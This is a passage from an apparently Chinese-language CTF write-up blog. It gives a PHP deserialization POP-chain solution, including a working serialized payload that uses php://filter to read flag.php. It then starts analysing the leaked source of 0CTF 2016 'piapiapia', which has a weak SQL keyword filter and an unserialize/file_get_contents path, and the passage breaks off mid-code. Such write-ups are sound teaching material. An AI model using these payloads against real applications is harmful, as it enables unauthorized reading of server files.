class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Modifier;</span><br><span class="line">$b = <span class="keyword">new</span> Test;</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line">$c = <span class="keyword">new</span> Show;</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line">$d = <span class="keyword">new</span> Show;</span><br><span class="line">$d-&gt;source = $c;</span><br></pre></td></tr></table></figure><p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Modifier;</span><br><span class="line">$b = <span class="keyword">new</span> Test;</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line">$c = <span class="keyword">new</span> Show;</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line">$d = <span class="keyword">new</span> Show;</span><br><span class="line">$d-&gt;source = $c;</span><br><span class="line"><span class="keyword">echo</span> serialize($d);</span><br></pre></td></tr></table></figure><p>于是最总payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Show"</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">"source"</span>;O:<span class="number">4</span>:<span class="string">"Show"</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">"source"</span>;N;s:<span class="number">3</span>:<span class="string">"str"</span>;O:<span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"p"</span>;O:<span class="number">8</span>:<span class="string">"Modifier"</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">"%00*%00var"</span>;s:<span class="number">59</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=./flag.php"</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">"str"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt=""></p><p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p><p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a href="http://www.zip源码泄露，代码审计" target="_blank" rel="noopener">www.zip源码泄露，代码审计</a></p><p>简单看一下，省略HTML和一些无关部分</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</span><br><span class="line">header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid user name or password'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">......(html)</span><br></pre></td></tr></table></figure><p>register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">$user-&gt;register($username, $password);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'User name Already Exists'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">......(html)</span><br></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname3'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">......(html)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">......(html)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">'hostname'</span>],</span><br><span class="line">$config[<span class="string">'username'</span>],</span><br><span class="line">$config[<span class="string">'password'</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p><p>在profile.php中看到有一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure><p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br></pre></td></tr></table></figure><p>找到<code>$profile</code>的定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile=$user-&gt;show_profile($username);</span><br></pre></td></tr></table></figure><p>跟进<code>show_profile</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在找到引用过这个函数的代码，在update.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure><p>可看到存在序列化操作，至此关系以及理清楚</p><p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p><p>再细看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname3'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span 